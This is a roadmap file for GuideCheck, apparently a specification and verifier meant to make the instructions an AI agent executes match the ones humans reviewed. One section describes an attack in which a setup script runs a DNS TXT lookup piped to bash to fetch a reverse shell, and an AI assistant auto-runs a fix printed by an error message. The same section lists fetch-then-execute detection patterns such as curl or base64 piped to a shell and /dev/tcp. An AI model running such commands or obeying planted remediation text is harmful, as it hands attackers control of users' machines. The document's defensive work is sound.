# Roadmap

Status: planning notes for actions not yet executed and decisions not yet made.

This roadmap is not normative. It records likely future work so unresolved
items are visible without being treated as commitments.

## Resolved in the 0.1.0 review

A round of open-question resolution on 2026-05-21 settled the decisions below.
Normative outcomes are already in `spec.md` and `verifier-conformance.md`; the
implementation-detail outcomes are pinned here as specs to build against.

- Verifier CLI: the reference verifier is invoked as `guidecheck-verify`, with
  `--json` (default), `--pretty`, and `--level N` flags; exit code 0 on pass,
  1 on conformance failure or a result below the asserted level, 2 on usage or
  IO error.
- Verifier input object: a single `input` object with a `mode` discriminator
  (`file` or `url`) and mode-appropriate fields; no separate object variants.
- Verifier thresholds: approval-count warning at 10; non-URL metadata value
  warning over 80 bytes; fetch caps and timeouts per `verifier-conformance.md`
  section 9. No fixed `last-reviewed` expiry; staleness keys off the
  publisher's `valid-until` only, and `last-reviewed` age is reported as info.
- `repository-url` is the source repository root, a single field, not a
  project page (`spec.md` section 11).
- Root and well-known guide copies, when both are served, must be
  byte-identical (`spec.md` section 6).
- `code-executing` actions require approval at Level 3 (`spec.md` section 12,
  `verifier-conformance.md` section 18).
- `networked` actions stay SHOULD-approval at Level 3 and MUST at Level 5; no
  change.
- The Level 4 anchor wire formats in `spec.md` section 11 are ratified as the
  0.2.0 normative set.
- The cross-channel anchors stay equal; signed `security.txt` is not promoted
  above the others.
- A public append-only transparency log is recognized as an independent
  cross-channel anchor (`spec.md` section 11).
- finding ids remain fixture-contract identifiers for the 0.2.0 release and
  become normative once the fixture corpus is complete.
- Generated evals are acceptable as a regression harness for the 0.2.0 release;
  a verifier conformance claim requires static fixtures, which 0.2.0 does not
  yet make.
- Hosted verifier UX stays implementation guidance; the compact report and the
  output schema are the only contract.

## Future profile directions

Candidates for 0.3.0 and later. Not commitments.

- A second independent verifier implementation in Go or Rust, ported from the
  Python reference and human-verified divergence by divergence. Targeted as
  the first reactivation move per the 2026-06-09 disposition note, not as
  active 0.6.x work. Language choice (Go vs Rust) deferred until reactivation;
  Go is the working preference for a parser/checker with simpler dependency
  graph, Rust offers stronger correctness primitives. Until then the
  conformance kit plus SHA256SUMS plus Sigstore signatures stand as the
  cross-implementation contract.

- A higher provenance tier above Level 5 requiring a code signature and a
  transparency-log entry. The conformance ladder stays 0 to 5 for now;
  provenance hardening would land within the existing tiers, not as a numbered
  Level 6.
- An optional signed verifier-report envelope for hosted checkers, CI, and
  assistant-runtime consumption.
- A future Level 5 runtime conformance profile. Detailed sequencing lives in
  `docs/level-5-implementation-plan.md`; roadmap entries here stay at the
  milestone level.
- A requirement that Level 5 runtimes publish an attestation or conformance
  report.
- A self-verification report published by hosted verifiers.
- Draft Level 5 planning lives in `docs/level-5-runtime-conformance.md` and
  `docs/level-5-implementation-plan.md`. Keep these as non-normative design
  notes until the Level 1-4 fixture and validation base is stronger.
- Signing fixture-suite releases once `verifier-conformance.md` reaches a
  stable conformance target; tracked also in `CONTRIBUTING.md`.

## Runtime-indirection threat class (2026-07-02)

Prompted by the 0din write-up "Clone This Repo and I Own Your Machine"
(https://0din.ai/blog/clone-this-repo-and-i-own-your-machine). That attack ships
a benign-looking `scripts/setup.sh` that runs `dig +short TXT _cfg.<attacker> |
bash`, fetching a base64 reverse-shell payload from an attacker-controlled DNS TXT
record; an assistant auto-runs the documented fix on error recovery. No malicious
bytes live in the repository and nothing is hidden in the text: the payload
materializes at runtime over DNS.

This is the same trust-boundary failure GuideCheck already names (the reviewed
surface should equal the executed surface), reached through runtime indirection and
transitive script invocation rather than presentation-layer hidden text. It is
inside the profile's thesis and only partly inside its current enforcement. Level 4
provenance is irrelevant here: an attacker who owns the repository can anchor a
byte-perfect Level 4 guide (`spec.md` section 27).

Already covered by the profile, verified 2026-07-02:

- `code-executing` actions (including `bash setup.sh`, `python -m pkg`) MUST require
  approval at Level 3 (`spec.md` section 12); a correctly declared block that omits
  approval is a blocking `approval.required-missing`.
- the prohibition on "decode, deobfuscate, or execute encoded content from any
  source" (`spec.md` section 15) names the base64-then-execute primitive.
- the integrity-versus-instruction fetch distinction (`spec.md` section 15) already
  separates the legitimate `_assistant-guide.<domain>` TXT anchor from a
  payload-bearing TXT fetch.
- a visible `curl URL | sh`, and now `dig TXT | bash` (see below), is a blocking
  `command.fetch-execute`.

Landed 2026-07-02 (reference verifier, additive detection, existing finding ids, no
profile version change):

- DNS clients (`dig`, `nslookup`, `host`, `drill`, `kdig`) added to the network-tool
  set, and bash `/dev/tcp` and `/dev/udp` pseudo-devices modeled as network access,
  in `scripts/guidecheck_verify.py`. A DNS TXT lookup piped into an interpreter now
  raises the same blocking `command.fetch-execute` as `curl | sh`; a bare DNS lookup
  or a `/dev/tcp` socket raises `network.command-implies-networked`. Regression
  coverage in `scripts/test_parser_edge_cases.py` and fixture
  `fixtures/invalid/command-dns-fetch-execute-as-normal`. Recorded in
  `threat-register.md`.
- Transitive-execution detection groundwork (the C2 gaps from the 0.7.0 proposal):
  `scripts/guidecheck_verify.py` now classifies a bare path-qualified executable
  (`./scripts/setup.sh`, `/opt/x/run`), an interpreter with a path argument
  (`sh ./install`), and container builds or runs
  (`docker`/`podman`/`buildah`/`nerdctl`) as `code-executing`, so under-declaring
  them as `class: normal` now raises `action-block.class.code-executing-missing`
  and `approval.command-implies-required` instead of nothing. Read-only container
  queries and data tools are guarded against false positives. Additive detection
  reusing existing warning ids; it is the substrate the 0.7.0 `action.exec-unbounded`
  rule keys off, not that rule itself. Regression coverage in
  `scripts/test_parser_edge_cases.py` and fixture
  `fixtures/invalid/command-local-script-under-declared`. Recorded in
  `threat-register.md`; the normative rule landed in `spec.md` section 12 in
  the 0.7.0 cycle.

Landed in 0.7.0 (spec plus docs, 2026-07-02): the bounded-execution rule below is
now normative in `spec.md` section 12 ("Code-executing actions and the review
boundary"), with the bound-versus-exempt axis, the `exec-sha256` and `exec-opaque`
action fields, the section 13 stop-and-ask item, the section 15 reinforcement, and
five finding ids in `finding-ids.md` and `verifier-conformance.md`. The profile is
bumped to 0.7.0 across all surfaces. Reference-verifier and hosted-verifier
enforcement of `action.exec-unbounded`, `exec-sha256` verification, and
transitive-closure scanning is the remaining work and is deferred to a 0.7.x
release; until then bounded-execution compliance is self-asserted. Tagging v0.7.0,
republishing the self-guide DNS TXT hash, and deploying the site are out-of-band
release steps. The bound-versus-exempt axis and the adversarial hardening behind
it are summarized in the covered/landed/candidate notes in this section and in
`threat-register.md`.

Remaining 0.7.x work (not commitments):

- Bound the transitive execution surface. A `code-executing` action that invokes a
  local script or entry point (`bash scripts/setup.sh`, `python -m pkg`, `make
  target`, `npm run x`) points at logic outside the reviewed 8 KiB artifact, so "one
  bounded artifact" does not hold transitively. Options: require the effective
  commands to be inlined as their own action blocks, require an `exec-sha256` field
  pinning the invoked bytes, or emit an explicit opaque-code-target finding so the
  human knows the guide is not self-contained at that action. This is the single most
  important structural gap the 0din class exposes, and it cannot be a verifier-only
  patch: the verifier has no script contents at review time.
- Add a stop-and-ask condition for acting on remediation text emitted by a failing
  command, tool, or error message (`spec.md` section 13). This names the exact 0din
  trigger: an assistant auto-running the fix printed by a RuntimeError. Any new
  finding id born from this work (for example a command-driven undeclared-egress
  error, or an unhashed-invoked-script error) must land with the spec text that
  defines it, not as a verifier-only addition.
- A Level 5 runtime requirement to surface the contents of an invoked script, and to
  treat any network or DNS fetch inside it as a `networked` sub-action under the
  declared `egress`, before approving a `code-executing` action. Durable defense;
  consistent with existing egress-enforcement language (`spec.md` section 12).

The planned instruction-surface scanner (see Adoption and distribution work, step 1)
targets hidden-instruction channels in text and by design vacuously passes a
repository with no hidden text, so it would not by itself flag the 0din repository.
Extend step 1 with a runtime-primitive dimension: scan the scripts that documented
setup commands invoke for fetch-then-execute shapes (pipe-to-interpreter, `base64 -d
| sh`, `/dev/tcp`, DNS or web fetch into exec). The scanner stays a discovery front
door, not a conformance gate.

## Near-term actions

- The reference verifier CLI covers Level 1 through Level 3 in local-file mode;
  it checks supplied sidecar manifest and independent-anchor evidence for
  consistency but caps at Level 3 (reporting `level4.requires-fetch`), since
  Level 4 requires fetched provenance. The hosted public-web verifier covers
  Level 1 through Level 4 for supported
  public-web anchors: package-registry metadata, transparency-log entries,
  DNS TXT records resolved over DNS-over-HTTPS, and repository-file evidence
  served by github.com.
  The hosted verifier is live as a preview at https://guidecheck.org/verify;
  do not present it as fully conformant, and do not claim Level 5 conformance,
  until the supporting runtime fixture suites are complete.
- Expand the repository-file anchor allowlist beyond github.com to gitlab.com,
  codeberg.org, bitbucket.org, and git.sr.ht in a future minor release; the
  0.6.0 cycle keeps it scoped to a single host while the channel beds in.
- Self-hosted Gitea, Forgejo, and GitLab instances cannot be allowlisted
  generically because each install lives on a different domain. A future
  per-instance opt-in (publisher declares `independent-repository-host` in the
  manifest, verifier honors it under stricter checks) is tracked as a
  candidate. No commitment.
- A future DNS TXT fetcher path that performs client-side DNSSEC validation
  with a vendored library, as an alternative to the current DoH-resolver
  reliance on the resolver's `AD` bit. No commitment.
- Add a Level 4 manifest for GuideCheck's own guide after an independent hash
  anchor is published.
- Add a signed or otherwise independently anchored `security.txt` plan before
  claiming it as a Level 4 channel.
- Add immutable release URLs and a static fixture for the tagged 0.2.0 release.
- Add signed verifier-report envelopes for hosted checker and CI consumption.
- Track repo-local blockers before executable Level 5 work in
  `docs/pre-level-5-readiness.md`.

## Adoption and distribution work

Sequenced adoption plan recorded 2026-07-01. Ordered: each step builds the
audience or the artifact the next step needs. Not commitments.

1. Scan existing instruction surfaces. Extend the verifier/scanner to check
   artifacts people already publish (`AGENTS.md`, `CLAUDE.md`, README install
   sections, skill files, MCP tool descriptions) for hidden-instruction
   channels: HTML comments, invisible Unicode, CSS-hidden text, escape
   sequences. A scan must deliver value at zero ecosystem adoption of
   `assistant-guide.txt`; the profile is the remediation path, the scanner is
   the front door.
2. One-command entry point. Package the scanner as `npx guidecheck scan
   <url-or-file>` (or `uvx guidecheck`) with ten seconds to first finding.
   Lead the site and README with the command and a short demo recording;
   reframe the top-line pitch from protocol language to "make sure your AI
   reads the same instructions you do." The spec moves one click deeper, not
   away.
3. Aggregate ecosystem scan. Use the scanner from step 1 against a defined
   corpus (for example, top 100 popular MCP servers or AI setup guides) and
   publish aggregate statistics plus positive callouts only. Responsible
   disclosure privately to any repository with a real finding; no named
   negative findings without consent. This is the white-hat salience test:
   measure engagement against prior spec-pitch posts.
4. Cut author cost to minutes. `guidecheck init` drafts an
   `assistant-guide.txt` from an existing README or INSTALL doc; a shields.io
   conformance badge ("GuideCheck L2") for adopter READMEs; a GitHub Action
   that verifies conformance in CI. The badge doubles as distribution on
   every adopting repository.
5. Borrowed distribution. Ride channels that already have audience: a Claude
   Code plugin or hook that checks for `assistant-guide.txt` (or scans the
   guide) before an agent follows setup instructions; MCP registries
   (official registry, Smithery, PulseMCP) treating conformance as a listing
   quality signal; an OWASP GenAI Security Project contribution citing
   GuideCheck as a prompt-injection mitigation for instruction surfaces
   (front-door route: open project meetings at
   https://genai.owasp.org/meetings/, OWASP Slack GenAI channels, and a
   GitHub issue or PR proposing GuideCheck for the AI Security Solutions
   Landscape); awesome-list entries for MCP and AI-security collections. The
   existing non-normative AOS integration note (see Documentation work) is
   the natural artifact to anchor the OWASP contribution.

Success measures per step: scanner installs and runs per week (1, 2), post
engagement relative to prior spec posts (3), badge count in the wild (4),
plugin installs and registry listings (5).

## Documentation work

- Extend the contents-with-anchor-links approach added to `spec.md` to
  `verifier-conformance.md` so both docs are navigable without depending on
  section numbers.
- Expand verifier author guidance with examples of compact reports and full
  machine-readable output.
- Add a non-normative AOS integration note describing how GuideCheck verifier
  output, guide hashes, action ids, approval decisions, and stop conditions
  can feed OWASP Agent Observability Standard trace, guardian, and AgBOM
  surfaces. The note must not make AOS a GuideCheck conformance dependency or
  imply OWASP endorsement.

The three integration notes below were added in the 0.3.x cycle and are
advisory perimeter documents, not core roadmap commitments. "Keep in sync"
means they track the normative documents; each may be restructured or
withdrawn without a profile version change.

- Keep the non-normative ACS integration note in `docs/acs-integration.md`
  describing how GuideCheck verifier output, action ids, approval gates,
  egress declarations, and stop conditions can feed Agent Control Standard
  runtime hooks, Guardian Agent verdicts, trace records, and AgBOM inventory.
  Keep ACS as a runtime-control integration surface, not a GuideCheck
  conformance dependency.
- Keep the non-normative MCP integration note in `docs/mcp-integration.md`
  describing where `assistant-guide.txt` can add value for MCP server
  installation guides, server manifests, tool permission review, resource
  exposure review, and MCP-host runtime enforcement. Keep the profile
  vendor-neutral and avoid making MCP a required transport or discovery
  mechanism.
- Keep the non-normative A2A integration note in `docs/a2a-integration.md`
  describing where GuideCheck can add value for Agent Card review,
  delegated-task instructions, remote-agent provenance, approval boundaries,
  and A2A task artifacts that instruct an assistant to act.
- Add an ecosystem relationship map showing how GuideCheck fits with
  Graceful Boundaries, Skill Provenance, Turnfile, Siteline, AI Posture, ACS,
  MCP, A2A, and AOS as delegated-agent trust infrastructure.
- Add a machine-onboarding page that summarizes GuideCheck's purpose,
  conformance limits, integration surfaces, and canonical docs for assistants
  and search systems without changing normative requirements.
- Add or refine a compact comparison of rendered review, raw-source review,
  and GuideCheck review integrity for public-facing education.
- Add a short threat-model primer for maintainers adding new finding ids.
- Expand the verifier examples page with full passing, failing, `not-found`,
  and warning-bearing JSON reports generated from current fixtures.

## Implementation work

- Maintain the local-file reference verifier CLI for Levels 1 through 3 and
  the hosted public-web verifier for Levels 1 through 4 on shared content and
  provenance checks. Do not extend either verifier to Level 5 runtime
  conformance until the supporting fixtures exist.
- Keep `scripts/eval_guidecheck.py` as a regression harness and reference map,
  not the verifier implementation.
- Continue separating the reference verifier from repository regression checks
  while preserving the same normalized fixture expectation contract.
- Emit machine-readable verifier output and the compact human-readable report
  from the same evidence model.
- Extend schema and fixture coverage as the local-file CLI contract evolves.
- Add exact JSON Schema validation for manifest, verifier output, and fixture
  expected files using a pinned portable tool.
- Add public-web replay fixtures through local HTTP servers for TLS edge cases
  and additional header variants.
- Replace modeled public-fetch scenarios with replayable public-web fixtures
  where practical, while keeping non-network deterministic tests as the default
  CI path.
- Add deterministic tests for the remaining cross-channel hash anchor types.
- Add tests for registry-url parsing across npm, PyPI, Cargo, and generic
  registry records.
- Treat runtime-policy mapping for tool calls, MCP tool invocations, and
  delegated A2A tasks as optional Level 5 enforced-surface design research.
  Do not make those surfaces core conformance dependencies without a future
  profile decision.
- Add example machine-readable event records for guide verification, action
  selection, approval prompts, approval results, command execution, egress
  checks, and stop-condition denials so AOS-compatible or other observability
  systems can consume GuideCheck evidence without treating the hosted verifier
  as a central oracle.

## Release readiness

- Public repository URL configured and documented.
- Default branch and remote publishing flow verified.
- Canonical site serves `/.well-known/assistant-guide.txt`.
- Canonical site serves schemas at `https://guidecheck.org/schemas/`.
- Canonical site serves or links machine-readable verifier output.
- Guide hash is published through at least one independent channel.
- `security.txt` expiration and contact ownership are reviewed.
- The changelog for the current profile version is complete.
- All static fixtures and generated evals pass in CI.
- Each release packages the fixture suite and schemas as a standalone
  conformance kit with a `SHA256SUMS` file, so independent verifier authors
  can target a pinned corpus. From 0.6.0 onward releases are signed with
  Sigstore cosign keyless from the tag-triggered release workflow at
  `.github/workflows/release.yml`, with verification identity locked to
  `https://github.com/snapsynapse/guidecheck/.github/workflows/release.yml@refs/tags/v*`
  and transparency-log entries in Rekor. The SHA256SUMS file remains the
  integrity reference for 0.5.0 and prior; 0.6.0+ ships `.sig` and `.crt`
  bundles alongside each artifact.
